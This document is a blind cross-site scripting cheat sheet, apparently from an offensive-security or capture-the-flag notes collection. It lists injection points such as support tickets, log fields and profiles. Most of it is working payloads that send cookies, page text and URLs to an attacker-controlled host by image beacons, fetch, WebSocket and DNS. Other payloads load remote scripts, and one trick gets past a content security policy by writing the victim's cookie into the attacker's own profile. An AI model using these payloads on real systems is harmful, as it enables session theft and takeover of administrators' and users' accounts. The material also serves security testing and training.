# Blind XSS — payloads that report back through a channel

You inject; someone else renders; you never see the page. The
payload must report back through a channel you control — the
"blind" in blind-XSS means you can't observe the render directly.

---

## 1. The blind-XSS shape — where it shows up

```text
- support-ticket "contact us" forms    → admin reads the ticket
- "report a bug" / feedback forms       → admin dashboard
- log fields (UA/referrer)              → admin log viewer
- profile fields (name/bio/website)     → profile views
- order notes / delivery instructions   → order-management admin
- application forms                     → hiring/admin review
- chat messages                         → moderator view
- file-upload filenames                 → the upload listing
- email content                         → webmail clients
```

The pattern: input lands in a page you CAN'T view, but a privileged
user CAN — your payload reports back instead of showing output.

---

## 2. The report-back channels — the three families

```javascript
// HTTP beacon — the standard:
new Image().src='//me/fired?ctx='+location.pathname;
fetch('//me/fired');
navigator.sendBeacon('//me/fired');

// DNS — for tight CSP:
new Image().src='//'+btoa(location.href)+'.me/';
   -- the page's URL lands in YOUR DNS query log

// WebSocket — long-lived:
new WebSocket('wss://me/').onopen=function(){
  this.send(document.cookie+location.href)};
```

Every channel carries a MARKER identifying which field/context
fired — `?ctx=support-form` / `?ctx=profile-bio` etc.

---

## 3. The payloads — from minimal to full-exfil

```javascript
// minimal — "did it fire?":
<img src=x onerror="new Image().src='//me/x'">
<script src="//me/x.js"></script>
<svg onload="fetch('//me/x')">

// context-reporting:
<img src=x onerror="fetch('//me/?c='+location.href)">
   -- which URL the payload fired on

// cookie exfil:
<img src=x onerror="new Image().src='//me/?c='+document.cookie">

// DOM readback:
<img src=x onerror="fetch('//me/?d='+btoa(document.body.innerText))">

// remote-script loader — the heavy exfil:
<script src="//me/x.js"></script>
   -- x.js runs in the target's context — full JS

// the polyglot for unknown-context:
'"><img src=x onerror="fetch('//me/?ctx=attr')">
```

---

## 4. The multi-marker strategy — name every field

Submit the SAME payload family to every candidate field, with a
unique marker per field:

```javascript
// ticket-subject field:
<img src=x onerror="fetch('//me/?f=subject')">
// ticket-body field:
<img src=x onerror="fetch('//me/?f=body')">
// username field:
<img src=x onerror="fetch('//me/?f=username')">
// your-name field on the report form:
<img src=x onerror="fetch('//me/?f=reporter')">
```

The listener hit names the field — you know exactly which injection
point worked.

---

## 5. The receiver — your own listener

```bash
# the repo tool:
python3 tools/web/oob_listener.py --port 8000

# the standard options:
# - requestbin / webhook.site — public, easy
# - interactsh — the burp-collaborator equivalent
# - your own flask/express — full control
# - burp collaborator — burp pro
```

The listener logs the marker + timestamp + source IP (the bot's —
confirms it's the admin not you).

---

## 6. The waiting problem — when does it fire?

```text
stored-in-admin-dashboard:    fires when admin logs in — unknown delay
support-ticket:                fires when admin reviews — minutes-hours
log-page:                       fires when admin checks logs — hours+
order-page:                     fires on order-processing — immediate-ish
report-queue:                   fires on moderation — minutes
```

You can't force the timing — plant the payload early, keep the
listener running, and check it when you come back.

---

## 7. The escalation — once a blind hit confirms the field

```text
marker fired → context confirmed → escalate to the exfil payload:
   <script src="//me/x.js"></script>   -- full remote script
   or fetch('/flag') → exfil          -- same-origin API read
```

The marker→exfil two-step: the marker proves the channel; the exfil
payload does the work. Don't skip the marker — a blind exfil with
no prior confirmation leaves you guessing which field worked.

---

## 8. The self-xss distinction — when "blind" is actually "self"

Some fields render ONLY for you (your own profile viewed by you) —
that's self-XSS, not blind. The difference:

```text
blind:  payload fires in ANOTHER user's browser (admin/bot)
self:   payload fires only in YOUR browser
```

Confirm the firing context's owner — the listener hit's source-IP
should be the bot's, not yours. If the only hit is your own render,
it's self-XSS — the pivot paths are `postmessage.md` §10 and
login-csrf chains.

---

## 9. The no-outbound endgame — CSP-blocking in a blind context

`connect-src 'self'` on the target — the beacon can't leave. The
app-as-channel paths:

```javascript
// write the loot into an app resource YOU can read:
fetch('/api/my-bio',{method:'POST',body:JSON.stringify(
  {bio:document.cookie})});
   -- the bot's session writes YOUR bio = their cookie
   -- you read your own bio later
```

Or the DNS channel (`img.src` to your hostname) if `img-src` is
open but `connect-src` isn't.
